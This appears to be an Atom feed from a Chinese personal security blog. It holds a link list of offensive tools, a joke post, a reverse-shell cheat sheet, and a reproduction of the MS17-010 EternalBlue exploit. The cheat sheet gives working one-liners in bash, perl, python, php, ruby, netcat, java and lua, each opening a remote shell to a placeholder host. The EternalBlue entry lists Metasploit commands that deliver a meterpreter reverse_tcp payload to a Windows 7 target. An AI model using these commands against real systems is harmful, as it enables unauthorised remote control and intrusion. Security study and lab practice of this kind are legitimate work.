&lt;h3 id=&quot;漏洞及渗透练习平台：&quot;&gt;&lt;a href=&quot;#漏洞及渗透练习平台：&quot; class=&quot;headerlink&quot; title=&quot;漏洞及渗透练习平台：&quot;&gt;&lt;/a&gt;漏洞及渗透练习平台：&lt;/h3&gt;&lt;h4 id=&quot;WebGoat漏洞练习环境&quot;&gt;&lt;a href=&quot;#WebGoat漏洞练习环境&quot; class=&quot;headerlink&quot; title=&quot;WebGoat漏洞练习环境&quot;&gt;&lt;/a&gt;WebGoat漏洞练习环境&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/WebGoat/WebGoat&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/WebGoat/WebGoat&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/WebGoat/WebGoat-Legacy&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/WebGoat/WebGoat-Legacy&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Damn-Vulnerable-Web-Application-漏洞练习平台&quot;&gt;&lt;a href=&quot;#Damn-Vulnerable-Web-Application-漏洞练习平台&quot; class=&quot;headerlink&quot; title=&quot;Damn Vulnerable Web Application(漏洞练习平台)&quot;&gt;&lt;/a&gt;Damn Vulnerable Web Application(漏洞练习平台)&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/RandomStorm/DVWA&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/RandomStorm/DVWA&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;数据库注入练习平台&quot;&gt;&lt;a href=&quot;#数据库注入练习平台&quot; class=&quot;headerlink&quot; title=&quot;数据库注入练习平台&quot;&gt;&lt;/a&gt;数据库注入练习平台&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;用node编写的漏洞练习平台，like-OWASP-Node-Goat&quot;&gt;&lt;a href=&quot;#用node编写的漏洞练习平台，like-OWASP-Node-Goat&quot; class=&quot;headerlink&quot; title=&quot;用node编写的漏洞练习平台，like OWASP Node Goat&quot;&gt;&lt;/a&gt;用node编写的漏洞练习平台，like OWASP Node Goat&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/cr0hn/vulnerable-node&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/cr0hn/vulnerable-node&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;花式扫描器-：&quot;&gt;&lt;a href=&quot;#花式扫描器-：&quot; class=&quot;headerlink&quot; title=&quot;花式扫描器 ：&quot;&gt;&lt;/a&gt;花式扫描器 ：&lt;/h3&gt;&lt;h4 id=&quot;端口扫描器Nmap&quot;&gt;&lt;a href=&quot;#端口扫描器Nmap&quot; class=&quot;headerlink&quot; title=&quot;端口扫描器Nmap&quot;&gt;&lt;/a&gt;端口扫描器Nmap&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/nmap/nmap&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/nmap/nmap&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;本地网络扫描器&quot;&gt;&lt;a href=&quot;#本地网络扫描器&quot; class=&quot;headerlink&quot; title=&quot;本地网络扫描器&quot;&gt;&lt;/a&gt;本地网络扫描器&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/SkyLined/LocalNetworkScanner&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/SkyLined/LocalNetworkScanner&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;子域名扫描器&quot;&gt;&lt;a href=&quot;#子域名扫描器&quot; class=&quot;headerlink&quot; title=&quot;子域名扫描器&quot;&gt;&lt;/a&gt;子域名扫描器&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/lijiejie/subDomainsBrute&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/lijiejie/subDomainsBrute&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;漏洞路由扫描器&quot;&gt;&lt;a href=&quot;#漏洞路由扫描器&quot; class=&quot;headerlink&quot; title=&quot;漏洞路由扫描器&quot;&gt;&lt;/a&gt;漏洞路由扫描器&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/jh00nbr/Routerhunter-2.0&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/jh00nbr/Routerhunter-2.0&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;迷你批量信息泄漏扫描脚本&quot;&gt;&lt;a href=&quot;#迷你批量信息泄漏扫描脚本&quot; class=&quot;headerlink&quot; title=&quot;迷你批量信息泄漏扫描脚本&quot;&gt;&lt;/a&gt;迷你批量信息泄漏扫描脚本&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/lijiejie/BBScan&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/lijiejie/BBScan&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Waf类型检测工具&quot;&gt;&lt;a href=&quot;#Waf类型检测工具&quot; class=&quot;headerlink&quot; title=&quot;Waf类型检测工具&quot;&gt;&lt;/a&gt;Waf类型检测工具&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/EnableSecurity/wafw00f&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/EnableSecurity/wafw00f&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;信息搜集工具&quot;&gt;&lt;a href=&quot;#信息搜集工具&quot; class=&quot;headerlink&quot; title=&quot;信息搜集工具 :&quot;&gt;&lt;/a&gt;信息搜集工具 :&lt;/h3&gt;&lt;h4 id=&quot;社工插件，可查找以email、phone、username的注册的所有网站账号信息&quot;&gt;&lt;a href=&quot;#社工插件，可查找以email、phone、username的注册的所有网站账号信息&quot; class=&quot;headerlink&quot; title=&quot;社工插件，可查找以email、phone、username的注册的所有网站账号信息&quot;&gt;&lt;/a&gt;社工插件，可查找以email、phone、username的注册的所有网站账号信息&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/n0tr00t/Sreg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/n0tr00t/Sreg&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息&quot;&gt;&lt;a href=&quot;#Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息&quot; class=&quot;headerlink&quot; title=&quot;Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息&quot;&gt;&lt;/a&gt;Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/sea-god/gitscan&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/sea-god/gitscan&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;github-Repo信息搜集工具&quot;&gt;&lt;a href=&quot;#github-Repo信息搜集工具&quot; class=&quot;headerlink&quot; title=&quot;github Repo信息搜集工具&quot;&gt;&lt;/a&gt;github Repo信息搜集工具&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/metac0rtex/GitHarvester&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/metac0rtex/GitHarvester&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;WEB：&quot;&gt;&lt;a href=&quot;#WEB：&quot; class=&quot;headerlink&quot; title=&quot;WEB：&quot;&gt;&lt;/a&gt;WEB：&lt;/h3&gt;&lt;h4 id=&quot;webshell大合集&quot;&gt;&lt;a href=&quot;#webshell大合集&quot; class=&quot;headerlink&quot; title=&quot;webshell大合集&quot;&gt;&lt;/a&gt;webshell大合集&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/tennc/webshell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/tennc/webshell&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;渗透以及web攻击脚本&quot;&gt;&lt;a href=&quot;#渗透以及web攻击脚本&quot; class=&quot;headerlink&quot; title=&quot;渗透以及web攻击脚本&quot;&gt;&lt;/a&gt;渗透以及web攻击脚本&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/brianwrf/hackUtils&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/brianwrf/hackUtils&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;web渗透小工具大合集&quot;&gt;&lt;a href=&quot;#web渗透小工具大合集&quot; class=&quot;headerlink&quot; title=&quot;web渗透小工具大合集&quot;&gt;&lt;/a&gt;web渗透小工具大合集&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/rootphantomer/hack_tools_for_me&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/rootphantomer/hack_tools_for_me&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;XSS数据接收平台&quot;&gt;&lt;a href=&quot;#XSS数据接收平台&quot; class=&quot;headerlink&quot; title=&quot;XSS数据接收平台&quot;&gt;&lt;/a&gt;XSS数据接收平台&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/firesunCN/BlueLotus_XSSReceiver&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/firesunCN/BlueLotus_XSSReceiver&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;XSS与CSRF工具&quot;&gt;&lt;a href=&quot;#XSS与CSRF工具&quot; class=&quot;headerlink&quot; title=&quot;XSS与CSRF工具&quot;&gt;&lt;/a&gt;XSS与CSRF工具&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/evilcos/xssor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/evilcos/xssor&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Short-for-command-injection-exploiter，web向命令注入检测工具&quot;&gt;&lt;a href=&quot;#Short-for-command-injection-exploiter，web向命令注入检测工具&quot; class=&quot;headerlink&quot; title=&quot;Short for command injection exploiter，web向命令注入检测工具&quot;&gt;&lt;/a&gt;Short for command injection exploiter，web向命令注入检测工具&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/stasinopoulos/commix&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/stasinopoulos/commix&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;数据库注入工具&quot;&gt;&lt;a href=&quot;#数据库注入工具&quot; class=&quot;headerlink&quot; title=&quot;数据库注入工具&quot;&gt;&lt;/a&gt;数据库注入工具&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/sqlmapproject/sqlmap&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/sqlmapproject/sqlmap&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Web代理，通过加载sqlmap-api进行sqli实时检测&quot;&gt;&lt;a href=&quot;#Web代理，通过加载sqlmap-api进行sqli实时检测&quot; class=&quot;headerlink&quot; title=&quot;Web代理，通过加载sqlmap api进行sqli实时检测&quot;&gt;&lt;/a&gt;Web代理，通过加载sqlmap api进行sqli实时检测&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/zt2/sqli-hunter&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/zt2/sqli-hunter&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;新版中国菜刀&quot;&gt;&lt;a href=&quot;#新版中国菜刀&quot; class=&quot;headerlink&quot; title=&quot;新版中国菜刀&quot;&gt;&lt;/a&gt;新版中国菜刀&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Chora10/Cknife&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/Chora10/Cknife&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;git泄露利用EXP&quot;&gt;&lt;a href=&quot;#git泄露利用EXP&quot; class=&quot;headerlink&quot; title=&quot;.git泄露利用EXP&quot;&gt;&lt;/a&gt;.git泄露利用EXP&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/lijiejie/GitHack&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/lijiejie/GitHack&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;浏览器攻击框架&quot;&gt;&lt;a href=&quot;#浏览器攻击框架&quot; class=&quot;headerlink&quot; title=&quot;浏览器攻击框架&quot;&gt;&lt;/a&gt;浏览器攻击框架&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/beefproject/beef&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/beefproject/beef&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;自动化绕过WAF脚本&quot;&gt;&lt;a href=&quot;#自动化绕过WAF脚本&quot; class=&quot;headerlink&quot; title=&quot;自动化绕过WAF脚本&quot;&gt;&lt;/a&gt;自动化绕过WAF脚本&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/khalilbijjou/WAFNinja&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/khalilbijjou/WAFNinja&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）&quot;&gt;&lt;a href=&quot;#http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）&quot; class=&quot;headerlink&quot; title=&quot;http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）&quot;&gt;&lt;/a&gt;http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/jkbrzt/httpie&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/jkbrzt/httpie&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;浏览器调试利器&quot;&gt;&lt;a href=&quot;#浏览器调试利器&quot; class=&quot;headerlink&quot; title=&quot;浏览器调试利器&quot;&gt;&lt;/a&gt;浏览器调试利器&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/firebug/firebug&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/firebug/firebug&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;一款开源WAF&quot;&gt;&lt;a href=&quot;#一款开源WAF&quot; class=&quot;headerlink&quot; title=&quot;一款开源WAF&quot;&gt;&lt;/a&gt;一款开源WAF&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/SpiderLabs/ModSecurity&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/SpiderLabs/ModSecurity&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;windows域渗透工具：&quot;&gt;&lt;a href=&quot;#windows域渗透工具：&quot; class=&quot;headerlink&quot; title=&quot;windows域渗透工具：&quot;&gt;&lt;/a&gt;windows域渗透工具：&lt;/h3&gt;&lt;h4 id=&quot;windows渗透神器&quot;&gt;&lt;a href=&quot;#windows渗透神器&quot; class=&quot;headerlink&quot; title=&quot;windows渗透神器&quot;&gt;&lt;/a&gt;windows渗透神器&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/gentilkiwi/mimikatz&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Powershell渗透库合集&quot;&gt;&lt;a href=&quot;#Powershell渗透库合集&quot; class=&quot;headerlink&quot; title=&quot;Powershell渗透库合集&quot;&gt;&lt;/a&gt;Powershell渗透库合集&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/PowerShellMafia/PowerSploit&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Powershell-tools合集&quot;&gt;&lt;a href=&quot;#Powershell-tools合集&quot; class=&quot;headerlink&quot; title=&quot;Powershell tools合集&quot;&gt;&lt;/a&gt;Powershell tools合集&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/clymb3r/PowerShell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/clymb3r/PowerShell&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Fuzz&quot;&gt;&lt;a href=&quot;#Fuzz&quot; class=&quot;headerlink&quot; title=&quot;Fuzz:&quot;&gt;&lt;/a&gt;Fuzz:&lt;/h3&gt;&lt;h4 id=&quot;Web向Fuzz工具&quot;&gt;&lt;a href=&quot;#Web向Fuzz工具&quot; class=&quot;headerlink&quot; title=&quot;Web向Fuzz工具&quot;&gt;&lt;/a&gt;Web向Fuzz工具&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/xmendez/wfuzz&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/xmendez/wfuzz&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;HTTP暴力破解，撞库攻击脚本&quot;&gt;&lt;a href=&quot;#HTTP暴力破解，撞库攻击脚本&quot; class=&quot;headerlink&quot; title=&quot;HTTP暴力破解，撞库攻击脚本&quot;&gt;&lt;/a&gt;HTTP暴力破解，撞库攻击脚本&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/lijiejie/htpwdScan&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/lijiejie/htpwdScan&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;漏洞利用及攻击框架：&quot;&gt;&lt;a href=&quot;#漏洞利用及攻击框架：&quot; class=&quot;headerlink&quot; title=&quot;漏洞利用及攻击框架：&quot;&gt;&lt;/a&gt;漏洞利用及攻击框架：&lt;/h3&gt;&lt;h4 id=&quot;msf&quot;&gt;&lt;a href=&quot;#msf&quot; class=&quot;headerlink&quot; title=&quot;msf&quot;&gt;&lt;/a&gt;msf&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/rapid7/metasploit-framework&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Poc调用框架，可加载Pocsuite-Tangscan，Beebeeto等&quot;&gt;&lt;a href=&quot;#Poc调用框架，可加载Pocsuite-Tangscan，Beebeeto等&quot; class=&quot;headerlink&quot; title=&quot;Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等&quot;&gt;&lt;/a&gt;Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/erevus-cn/pocscan&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/erevus-cn/pocscan&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Pocsuite&quot;&gt;&lt;a href=&quot;#Pocsuite&quot; class=&quot;headerlink&quot; title=&quot;Pocsuite&quot;&gt;&lt;/a&gt;Pocsuite&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/knownsec/Pocsuite&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/knownsec/Pocsuite&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Beebeeto&quot;&gt;&lt;a href=&quot;#Beebeeto&quot; class=&quot;headerlink&quot; title=&quot;Beebeeto&quot;&gt;&lt;/a&gt;Beebeeto&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/n0tr00t/Beebeeto-framework&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/n0tr00t/Beebeeto-framework&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="网络安全" scheme="http://yingzhzh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="http://yingzhzh.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="资源整理" scheme="http://yingzhzh.github.io/tags/%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Linux 下多种反弹 shell 方法</title>
    <link href="http://yingzhzh.github.io/2017/08/02/linux-reverse-shell/"/>
    <id>http://yingzhzh.github.io/2017/08/02/linux-reverse-shell/</id>
    <published>2017-08-02T03:37:27.000Z</published>
    <updated>2017-08-02T03:44:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>bash命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure></p>
<p>perl版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;</div></pre></td></tr></table></figure></p>
<p>python版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure></p>
<p>php版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></td></tr></table></figure></p>
<p>ruby版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure></p>
<p>nc 版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 1234</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</div><div class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</div></pre></td></tr></table></figure></p>
<p>java 版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure></p>
<p>lua版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;10.0.0.1&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;bash命令：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yingzhzh.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="linux" scheme="http://yingzhzh.github.io/tags/linux/"/>
    
      <category term="shell" scheme="http://yingzhzh.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>2333333</title>
    <link href="http://yingzhzh.github.io/2017/08/01/2333333/"/>
    <id>http://yingzhzh.github.io/2017/08/01/2333333/</id>
    <published>2017-08-01T06:57:10.000Z</published>
    <updated>2017-08-02T03:26:50.000Z</updated>
    
    <content type="html"><![CDATA[<center><br>22332222223332222223322333322333222233322333322<br>22322222222322222222322333322332233223322333322<br>22332222222222222223322333322322333322322333322<br>22333322222222222233333222233322333322322333322<br>22333333222222223333333322333322333322322333322<br>22333333332222333333333322333332233223322333322<br>22333333333223333333333322333333222233332222223<br></center><br><center><br>1. chrome 打开<br>2. ctrl+F<br>3. 然后输入 2<br></center>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;br&gt;22332222223332222223322333322333222233322333322&lt;br&gt;22322222222322222222322333322332233223322333322&lt;br&gt;22332222222222222223322333
    
    </summary>
    
      <category term="生活娱乐" scheme="http://yingzhzh.github.io/categories/%E7%94%9F%E6%B4%BB%E5%A8%B1%E4%B9%90/"/>
    
    
      <category term="特殊的表白姿势" scheme="http://yingzhzh.github.io/tags/%E7%89%B9%E6%AE%8A%E7%9A%84%E8%A1%A8%E7%99%BD%E5%A7%BF%E5%8A%BF/"/>
    
      <category term="666" scheme="http://yingzhzh.github.io/tags/666/"/>
    
  </entry>
  
  <entry>
    <title>ms17010-exploit</title>
    <link href="http://yingzhzh.github.io/2017/08/01/ms17010-exploit/"/>
    <id>http://yingzhzh.github.io/2017/08/01/ms17010-exploit/</id>
    <published>2017-08-01T05:26:26.000Z</published>
    <updated>2017-08-07T05:51:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.hi-noob.com/20170427/ms17_010/" title="ms17-010 exp复现" target="_blank" rel="external">原文:http://www.hi-noob.com/20170427/ms17_010</a></p>
<p>前言</p>
<p>Shadow Brokers公布的文件需要win32位+python2.6+pywin32环境，利用起来有很多设置，略显麻烦，正好t00ls有相关的exp和利用过程，我就写了这篇文章记录我自己的一个复现过程。</p>
<a id="more"></a> 
<h1 id="0x00-创建wine"><a href="#0x00-创建wine" class="headerlink" title="0x00 创建wine"></a>0x00 创建wine</h1><p>kali 64位</p>
<p>kali 64位需要兼容32位环境才可以使用,执行以下命令来安装32位运行库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&apos;dpkg --add-architecture i386</div><div class="line">apt-get update</div><div class="line">apt-get install lib32z1 lib32ncurses5</div><div class="line">apt-get install wine32</div><div class="line">wine cmd.exe&apos;</div></pre></td></tr></table></figure></p>
<p>kali 32位<br>直接执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;wine cmd.exe&apos;</div></pre></td></tr></table></figure></p>
<p>即可<br><img src="http://op2ihgtv7.bkt.clouddn.com/2.png" alt=""></p>
<h1 id="0x01修改exp"><a href="#0x01修改exp" class="headerlink" title="0x01修改exp"></a>0x01修改exp</h1><p>下载exp:<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/</a><br>解压文件将其中的deps文件夹和eternalblue_doublepulsar.rb复制到/usr/share/metasploit-framework/modules/exploits/windows/smb/下,我在这里将eternalblue_doublepulsar.rb重命名为ms17_010_smb_RCE.rb,方便以后的查找利用。<br>修改rb文件<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/1.png" alt=""></p>
<h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><p>攻击机：kali 192.168.1.108</p>
<p>靶 机：win7 64位 旗舰版 sp1(关闭防火墙)</p>
<p>MSF使用就很简单了，下面列出主要的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&apos;use exploit/windows/smb/ms17_010_smb_RCE</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.108</div><div class="line">set rhost 192.168.1.107</div><div class="line">set target 9</div><div class="line">set targetarchitecture x64</div><div class="line">exploit&apos;</div></pre></td></tr></table></figure></p>
<p>附效果图<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/3.jpg" alt=""></p>
